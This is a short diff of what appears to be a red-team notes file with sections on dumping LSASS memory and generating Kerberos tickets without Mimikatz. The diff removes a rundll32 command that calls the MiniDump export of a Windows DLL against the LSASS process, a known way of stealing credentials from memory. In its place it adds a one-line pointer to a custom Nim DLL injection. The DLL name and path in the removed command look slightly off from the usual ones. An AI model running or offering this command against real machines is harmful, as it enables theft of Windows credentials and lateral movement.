@@ -4,11 +4,7 @@
 
 ## LSASS Dump Through Comsvc.dll
 
-
-`get process id of lsass`
-
-`rundll32.exe c:\Windows\system\comsvc.dll, MiniDump 552 C:\Windows\temp\mini.dump full`
-
+use nim custom .dll inject
 
 ## Total Not Mimikatz Ticket Generation
 
